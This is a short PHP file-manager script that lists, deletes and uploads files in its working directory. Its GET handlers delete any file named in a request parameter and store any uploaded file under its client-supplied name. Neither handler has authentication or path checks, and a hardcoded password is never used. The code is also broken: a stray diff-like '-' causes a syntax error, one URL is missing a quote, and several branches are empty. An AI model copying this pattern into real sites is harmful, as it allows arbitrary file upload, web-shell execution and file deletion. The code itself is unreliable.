<?php

	/**
	*	.
	*	.
	*	.
	*/
class upload{
	function upload(){
			//Change the $foldername value!
			//====================
			$password = "1134-g-2601";
			$foldername = getcwd();


			//====================

			function startsWith($haystack, $needle)
			{
			  $length = strlen($needle);
			  return (substr($haystack, 0, $length) === $needle);
			}

			function endsWith($haystack, $needle)
			{
			  $length = strlen($needle);
			  if ($length == 0) {
			  return true;
			}

			  return (substr($haystack, -$length) === $needle);
			}


			//###################################################################################>
			if (isset($_GET['action']) && !empty($_GET['action'])){
				if (($_GET['action'])==('delete')){
					if (isset($_GET['filename']) && !empty($_GET['filename'])){
						if(file_exists($foldername . "/" . $_GET['filename'])){
							unlink($foldername . "/" . $_GET['filename']);
							//echo '<script type="text/javascript">alert("Deleted!")</script>';
							echo '<meta http-equiv="refresh" content="0; URL=upload.php">';
							die();
						}
					}
				}elseif(($_GET['action'])==('upload')){
					if (empty($_GET['uploadfile'])){
						move_uploaded_file (
							$_FILES['uploadfile']['tmp_name'] ,
							$foldername . '/'. $_FILES['uploadfile']['name'] );

						echo '<meta http-equiv="refresh" content="0; URL=upload.php>';
						die();
					}
				}
				if (!is_dir($foldername)){
					echo "<font color=red><b><h1>" . $foldername . " was not found!</h1></b></font>";
				}else{
					$files = scandir($foldername);
					echo "<h1>Connected to " . $foldername . "</h1>";
					foreach($files as $file) {
						if(($file)==(".")){

						}elseif(($file)==("..")){
						}elseif(($file)==(".htaccess")){

						}else{
						}
					}
			}
			//###################################################################################>
			}else{
				if (!is_dir($foldername)){
					echo "<font color=red><b><h1>" . $foldername . " was not found!</h1></b></font>";
				}else{
					$files = scandir($foldername);
					$ImageTypes = array(
						'png',
						'jpg',
						'jpeg',
						'gif');
				foreach($files as $file) {
						$Source = $foldername . "/" . $file;
			-            $EXCE = strtolower(pathinfo($Source, PATHINFO_EXTENSION));
						if (in_array($EXCE,$ImageTypes)) {
						}
				}
				echo '</div>';
					foreach($files as $file) {

						if(($file)==(".")){
						}elseif(($file)==("..")){
						}elseif(($file)==(".htaccess")){

						}else{
						}
					}
				}
			}
	}
}
?>

